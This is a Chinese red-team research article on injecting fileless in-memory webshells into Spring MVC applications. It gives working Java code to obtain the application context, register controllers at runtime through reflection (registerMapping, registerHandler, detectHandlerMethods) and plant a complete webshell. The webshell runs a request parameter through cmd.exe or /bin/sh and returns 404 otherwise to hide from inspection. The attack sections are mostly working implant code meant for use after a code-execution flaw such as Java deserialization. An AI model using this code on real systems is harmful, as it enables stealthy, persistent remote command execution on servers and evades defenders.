> 原文链接: https://www.anquanke.com//post/id/198886 


# 基于内存 Webshell 的无文件攻击技术研究


                                阅读量   
                                **1311282**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                    



[![](https://p5.ssl.qhimg.com/t0148224a443df1a2c4.gif)](https://p5.ssl.qhimg.com/t0148224a443df1a2c4.gif)



作者: LandGrey@观星实验室

## 一. 情况介绍

红队人员在面对蓝队的严防死守与”盯梢”式的防御策略时，传统需要文件落地的攻击技术往往会受到掣肘，基于 Web 的无文件攻击技术逐渐成为 Web 安全的一种新的研究趋势。

所以我们重点研究了基于 Java 的常用 Web 框架 — SpringMvc，并实现了利用多种不同的技术手段，往内存中注入恶意 Webshell 代码的无文件攻击技术。



## 二. 必要知识

在切入正题前，首先需要了解下 Spring 框架中的几个必要的名词术语。

### Bean

bean 是 Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。

通俗来讲：
- bean 是对象
- bean 被 IoC 容器管理
- Spring 应用主要是由一个个的 bean 构成的
### ApplicationContext

Spring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者。

从下面的接口继承关系图中可以看出，ApplicationContext 接口继承了 BeanFactory 接口，并通过继承其他接口进一步扩展了基本容器的功能。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_207_/t01452143b87b518333.png)

因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。

IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。

另外，如下图，还有一堆各式各样的 context 继承了 ApplicationContext 接口，太繁杂不展开描述，仅供参考。

[![](https://p1.ssl.qhimg.com/t0131f86d1b36acf0c8.png)](https://p1.ssl.qhimg.com/t0131f86d1b36acf0c8.png)

### ContextLoaderListener 与 DispatcherServlet

下面是一个典型 Spring 应用的 web.xml 配置示例：

```
&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xmlns="http://java.sun.com/xml/ns/javaee"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
         version="2.5"&gt;

    &lt;display-name&gt;HelloSpringMVC&lt;/display-name&gt;

    &lt;context-param&gt;
        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
        &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;
    &lt;/context-param&gt;

    &lt;listener&gt;
        &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;
    &lt;/listener&gt;

    &lt;servlet&gt;
        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
            &lt;param-value&gt;/WEB-INF/dispatcherServlet-servlet.xml&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;

    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
&lt;/web-app&gt;
```

在正式了解上面的配置前，先介绍下关于 Root Context 和 Child Context 的重要概念：
- Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context
- 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean
- 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中
**ContextLoaderListener**

ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。

回到 web.xml 中，其相关配置如下：

```
&lt;context-param&gt;
    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
    &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;
&lt;/context-param&gt;

&lt;listener&gt;
    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;
&lt;/listener&gt;
```

依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 /WEB-INF/applicationContext.xml，作为配置文件，所以其实上面的 &lt;context-param&gt; 标签对其实完全可以去掉。

**DispatcherServlet**

DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。

从下面的继承关系图中可以发现： DispatcherServlet 从本质上来讲是一个 Servlet（扩展了 HttpServlet )。

[![](https://p0.ssl.qhimg.com/t01b9de12b14cc8e673.png)](https://p0.ssl.qhimg.com/t01b9de12b14cc8e673.png)

回到 web.xml 中，其相关配置如下：

```
&lt;servlet&gt;
    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
        &lt;param-value&gt;/WEB-INF/dispatcherServlet-servlet.xml&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;
```

上面给 org.springframework.web.servlet.DispatcherServlet 类设置了个别名 dispatcherServlet ，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml。

依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 /WEB-INF/&lt;servlet-name&gt;-servlet.xml，作为配置文件。因为上面的 &lt;servlet-name&gt; 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件。

综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。

如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。



## 三. 技术要点
- Q: spring 内存注入 Webshell，要达到什么样的效果？
- A: 一言以蔽之：在执行完一段 java 代码后，可通过正常的 URL 访问到内存中的 Webshell 获得回显即可。
在经过一番文档查阅和源码阅读后，发现可能有不止一种方法可以达到以上效果。其中通用的技术点主要有以下几个：
1. 在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；
1. 在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；
1. controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；


## 四. 技术实现

### 获得当前代码运行时的上下文环境

**方法一**：getCurrentWebApplicationContext

```
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

如下图， getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。

注意这里及下面实现方法中的 Root WebApplicationContext 都是后文的一个伏笔。

[![](https://p3.ssl.qhimg.com/dm/1024_367_/t011b80fe0df23f4ca2.png)](https://p3.ssl.qhimg.com/dm/1024_367_/t011b80fe0df23f4ca2.png)

**方法二**：WebApplicationContextUtils

```
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 WebApplicationContextUtils的

```
public static WebApplicationContext getWebApplicationContext(ServletContext sc)

```

方法来获得当前上下文环境。其中 WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。

剩余部分代码，都是用来获得 ServletContext 类的一个实例。仔细研究后可以发现，上面的代码完全可以简化成方法三中的代码。

**方法三**：RequestContextUtils

```
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

上面的代码使用 RequestContextUtils 的

```
public static WebApplicationContext getWebApplicationContext(ServletRequest request)

```

方法，通过 ServletRequest 类的实例来获得 WebApplicationContext 。

如下图，可以发现此方法获得的是一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。这个 dispatcherServlet-servlet 其实是上面配置中 dispatcherServlet-servlet.xml 的文件名。

[![](https://p2.ssl.qhimg.com/dm/1024_382_/t01ab22f6583f46145a.png)](https://p2.ssl.qhimg.com/dm/1024_382_/t01ab22f6583f46145a.png)

进一步分析，代码中有个 RequestContextHolder.currentRequestAttributes() ，在前置知识中已经提到过

所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

然后如下图，查看当前所有的 attributes，发现确实保存有 Context 的属性名。

其中 org.springframework.web.servlet.DispatcherServlet.CONTEXT 和 org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE 属性名中都存放着一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext 。

[![](https://p5.ssl.qhimg.com/dm/1024_473_/t016ca4129bf6e6c8d9.png)](https://p5.ssl.qhimg.com/dm/1024_473_/t016ca4129bf6e6c8d9.png)

**方法四**：getAttribute

```
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

从方法三的分析来看，其实完全可以将存放在 ServletContext 属性中的 Context 取出来直接使用。在阅读相关源码后发现，上面代码中的 currentRequestAttributes() 替换成 getRequestAttributes() 也同样有效；getAttribute 参数中的 0代表从当前 request 中获取而不是从当前的 session 中获取属性值。

因此，使用以上代码也可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。

### 手动注册 controller

一个正常的 Controller 示例代码如下，当用浏览器访问 /hello 路径时，会在定义好的 View 中输出 hello World 字样。

```
@Controller
public class HelloController `{`
    @RequestMapping(value = "/hello", method = RequestMethod.GET)
    public String hello(@RequestParam(value="name", required=false, defaultValue="World") String name, Model model) `{`
        model.addAttribute("name", name);
        return "hello";
    `}`
`}`
```

如下图：Spring 3.2.5 处理 URL 映射相关的类都实现了 HandlerMapping 接口。

[![](https://p0.ssl.qhimg.com/t01dcddfa490b6438a8.png)](https://p0.ssl.qhimg.com/t01dcddfa490b6438a8.png)

Spring 2.5 开始到 Spring 3.1 之前一般使用 org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ；

Spring 3.1 开始及以后一般开始使用新的 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持[@Contoller](https://github.com/Contoller)和[@RequestMapping](https://github.com/RequestMapping)注解。

当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 bean。又因版本不同和较多的接口等原因，手工注册动态 controller 的方法不止一种。

**方法一**：registerMapping

在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。

相关示例代码和解释如下：

```
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("me.landgrey.SSOLogin").newInstance(), method);
```

**方法二**：registerHandler

参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类

```
org.springframework.web.servlet.handler.AbstractUrlHandlerMapping
```

进入查看代码，发现其中有一个registerHandler 方法，摘录关键部分如下：

```
protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException `{`
    ...
    Object resolvedHandler = handler;
    if (!this.lazyInitHandlers &amp;&amp; handler instanceof String) `{`
        String handlerName = (String)handler;
        if (this.getApplicationContext().isSingleton(handlerName)) `{`
            resolvedHandler = this.getApplicationContext().getBean(handlerName);
        `}`
    `}`
    Object mappedHandler = this.handlerMap.get(urlPath);
    if (mappedHandler != null) `{`
        if (mappedHandler != resolvedHandler) `{`
            throw new IllegalStateException("Cannot map " + this.getHandlerDescription(handler) + " to URL path [" + urlPath + "]: There is already " + this.getHandlerDescription(mappedHandler) + " mapped.");
    ...
    `}` else `{`
        this.handlerMap.put(urlPath, resolvedHandler);
        if (this.logger.isInfoEnabled()) `{`
            this.logger.info("Mapped URL path [" + urlPath + "] onto " + this.getHandlerDescription(handler));
        `}`
    `}`
`}`
```

该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。

相关示例代码和解释如下：

```
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

**方法三**：detectHandlerMethods

参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类

```
org.springframework.web.servlet.handler.AbstractHandlerMethodMapping
```

进入查看代码，发现其中有一个detectHandlerMethods 方法，代码如下：

```
protected void detectHandlerMethods(Object handler) `{`
    Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
    final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);
    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() `{`
        public boolean matches(Method method) `{`
            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;
        `}`
    `}`);
    Iterator var6 = methods.iterator();
    while(var6.hasNext()) `{`
        Method method = (Method)var6.next();
        T mapping = this.getMappingForMethod(method, userType);
        this.registerHandlerMethod(handler, method, mapping);
    `}`
`}`
```

该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。

示例代码如下：

```
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```

### controller 中的 Webshell 逻辑

在使用 registerMapping 动态注册 controller 时，不需要强制使用 [@RequestMapping](https://github.com/RequestMapping) 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用[@RequestMapping](https://github.com/RequestMapping) 注解 。

除此之外，将 Webshell 的代码逻辑写在主要的 Controller 方法中即可。

下面提供一个简单的用来执行命令回显的 Webshell 代码示例：

```
package me.landgrey;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

@Controller
public class SSOLogin `{`

    @RequestMapping(value = "/favicon")
    public void login(HttpServletRequest request, HttpServletResponse response)`{`
        try `{`
            String arg0 = request.getParameter("code");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) `{`
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win"))`{`
                    p = new java.lang.ProcessBuilder(new String[]`{`"cmd.exe", "/c", arg0`}`);
                `}`else`{`
                    p = new java.lang.ProcessBuilder(new String[]`{`"/bin/sh", "-c", arg0`}`);
                `}`
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            `}`else`{`
                response.sendError(404);
            `}`
        `}`catch (Exception e)`{`
        `}`
    `}`
`}`
```

代码比较简单，达到的效果是，当请求没有携带指定的参数(code)时，返回 404 错误，当没有经验的人员检查时，因为 Webshell 仅存在于内存中，直接访问又是 404 状态码，所以很可能会认为 Webshell 不存在或者没有异常了。

[![](https://p4.ssl.qhimg.com/t010297a2a959583afb.png)](https://p4.ssl.qhimg.com/t010297a2a959583afb.png)

[![](https://p1.ssl.qhimg.com/t012665e5e2f729e36b.png)](https://p1.ssl.qhimg.com/t012665e5e2f729e36b.png)



## 五. 注意事项

不同的映射处理器

如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。

```
&lt;bean class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" /&gt;
&lt;bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter" /&gt;
```

### Root Context 与 Child Context

上文展示的四种获得当前代码运行时的上下文环境的方法中，推荐使用后面两种方法获得 Child WebApplicationContext。

这是因为：根据习惯，在很多应用配置中注册Controller 的 component-scan 组件都配置在类似的 dispatcherServlet-servlet.xml 中，而不是全局配置文件 applicationContext.xml 中。

这样就导致 RequestMappingHandlerMapping 的实例 bean 只存在于 Child WebApplicationContext 环境中，而不是 Root WebApplicationContext 中。上文也提到过，Root Context无法访问Child Context中定义的 bean，所以可能会导致 Root WebApplicationContext 获得不了 RequestMappingHandlerMapping 的实例 bean 的情况。

另外，在有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件，这时候通过前两种方法是获取不到Root WebApplicationContext的。

### 应用场景

既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的代码执行漏洞才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。



## 六. 演示

本文技术的具体实现已集成到实验室内部的 Webshell 管理工具中，下面的动态图片演示了在 SpringMvc 环境中向内存注入一个自定义 URL 的 Webshell 操作。

[![](https://p2.ssl.qhimg.com/t019d19e6afa7419b10.gif)](https://p2.ssl.qhimg.com/t019d19e6afa7419b10.gif)



## 参考链接：

Spring Framework 5 中文文档

Spring源码阅读-ApplicationContext体系结构分析

contextloaderlistener-vs-dispatcherservlet

DispatcherServlet与ContextLoaderListener的对比

Spring MVC手动注册requestMapping

动态注册bean后手动注册controller
